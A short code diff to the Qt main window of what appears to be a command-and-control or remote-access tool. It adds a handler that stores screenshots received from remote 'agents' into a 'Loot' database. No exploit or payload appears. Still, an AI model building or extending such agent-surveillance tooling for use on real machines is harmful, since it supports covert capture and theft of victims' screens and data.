@@ -108,6 +108,22 @@ MainWindow::MainWindow(Server* server, QWidget* parent)
     connect(m_server, &Server::screenshotReceived, m_mediaPanel, &MediaPanel::displayScreenshot);
     connect(m_mediaPanel, &MediaPanel::statusMessage, this, &MainWindow::onStatusMessage);
 
+    // Save screenshot to Loot database
+    connect(m_mediaPanel, &MediaPanel::saveToLootRequested, this,
+        [this](const QString& ip, const QByteArray& jpeg,
+               int width, int height) {
+            QString uuid = m_agentIpToUuid.value(ip);
+            if (uuid.isEmpty()) {
+                onStatusMessage(QString("Save to Loot failed: unknown agent %1").arg(ip));
+                return;
+            }
+            Inferno_Database::instance().logLoot(
+                uuid, "screenshot.jpg", "image/jpeg", jpeg);
+            onStatusMessage(QString("Screenshot saved to Loot (%1x%2, %3 KB) from %4")
+                                .arg(width).arg(height)
+                                .arg(jpeg.size() / 1024).arg(ip));
+        });
+
     // Connect Business Logic Service for real-time notification updates
     connect(&IntelAnalysisService::instance(), &IntelAnalysisService::intelligenceUpdated, this, &MainWindow::handleIntelligenceUpdated);
 }
